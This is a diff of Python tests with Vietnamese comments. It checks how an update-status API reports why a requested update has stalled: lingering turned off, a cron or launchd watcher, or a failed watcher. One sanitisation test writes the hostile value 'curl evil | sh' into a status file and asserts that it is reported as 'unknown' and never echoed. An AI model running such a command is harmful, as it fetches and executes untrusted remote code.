@@ -85,6 +85,30 @@ def test_old_request_with_failed_watcher_is_watcher_failed(link: Path) -> None:
         assert upd._state()["stalled_reason"] == "not_picked_up", ok
 
 
+def test_linger_off_is_not_blamed_when_the_watcher_is_not_systemd(link: Path) -> None:
+    """Trình nhận yêu cầu crontab/launchd chạy cả khi không ai đăng nhập: genh vẫn ghi giá trị loginctl thật ('no') vào
+    autostart-status.json, nhưng nhắc `enable-linger` không chữa được gì ⇒ không đổ cho linger."""
+    _request_old(link)
+    _write(link, "autostart-status.json", {"linger": "no", "linger_required": False, "docker_enabled": "yes"})
+    for updater in ("cron", "launchd"):
+        _write(link, "genh.json", {"version": "v0.1.53", "updater": updater})
+        assert upd._state()["stalled_reason"] == "not_picked_up", updater
+    # Kể cả khi linger "bắt buộc" vì Docker rootless: trình nhận yêu cầu vẫn là crontab.
+    _write(link, "autostart-status.json", {"linger": "no", "linger_required": True})
+    _write(link, "genh.json", {"version": "v0.1.53", "updater": "cron"})
+    assert upd._state()["stalled_reason"] == "not_picked_up"
+    _write(link, "nightly-status.json", {"request_watcher": "failed"})
+    assert upd._state()["stalled_reason"] == "watcher_failed"
+    (link / "nightly-status.json").unlink()
+    # genh cũ không ghi `updater`: dựa vào linger_required.
+    _write(link, "genh.json", {"version": "v0.1.52"})
+    assert upd._state()["stalled_reason"] == "linger_off"
+    _write(link, "autostart-status.json", {"linger": "no", "linger_required": False})
+    assert upd._state()["stalled_reason"] == "not_picked_up"
+    _write(link, "genh.json", {"version": "v0.1.53", "updater": "systemd"})
+    assert upd._state()["stalled_reason"] == "linger_off"
+
+
 def test_fresh_heartbeat_keeps_requested_and_host_busy(link: Path) -> None:
     """Máy chủ đang bận (nhịp sống tươi) ⇒ yêu cầu chỉ đang xếp hàng, KHÔNG phải linger tắt — không đổi so với trước."""
     _request_old(link, minutes=40)
@@ -207,22 +231,23 @@ async def test_payload_has_stalled_reason_and_filtered_nightly(owner_api: Api, l
     last_run = _iso(hours=5)
     _write(link, "nightly-status.json", {
         "schema": 1, "mechanism": "systemd", "enabled": True, "active": True, "unit_present": True,
-        "opted_out": False, "since": _iso(days=9), "last_run_at": last_run, "last_result": "done",
-        "next_run_at": "2099-01-01T03:00:00Z", "linger": "no", "request_watcher": "active",
+        "opted_out": False, "owned_by_other": False, "since": _iso(days=9), "last_run_at": last_run,
+        "last_result": "done", "next_run_at": "2099-01-01T03:00:00Z", "linger": "no", "request_watcher": "active",
         "checked_at": _iso(minutes=3)})
     body = (await owner_api.get("/system/update")).json()
     assert body["state"] == "stalled" and body["stalled_reason"] == "linger_off"
     assert body["nightly"] == {"mechanism": "systemd", "enabled": True, "active": True, "opted_out": False,
-                               "last_run_at": last_run, "next_run_at": "2099-01-01T03:00:00Z"}
+                               "owned_by_other": False, "last_run_at": last_run,
+                               "next_run_at": "2099-01-01T03:00:00Z"}
 
     # Giá trị lạ ⇒ 'unknown'/null, không 500, không mang chữ lạ ra ngoài.
     _write(link, "nightly-status.json", {
-        "mechanism": "curl evil | sh", "enabled": "yes", "active": 1, "opted_out": "false",
+        "mechanism": "curl evil | sh", "enabled": "yes", "active": 1, "opted_out": "false", "owned_by_other": "x",
         "last_run_at": "hôm qua", "next_run_at": {"x": 1}, "linger": "maybe", "request_watcher": 7})
     r = await owner_api.get("/system/update")
     assert r.status_code == 200, r.text
     assert r.json()["nightly"] == {"mechanism": "unknown", "enabled": None, "active": None, "opted_out": None,
-                                   "last_run_at": None, "next_run_at": None}
+                                   "owned_by_other": None, "last_run_at": None, "next_run_at": None}
     assert "evil" not in r.text
 
 
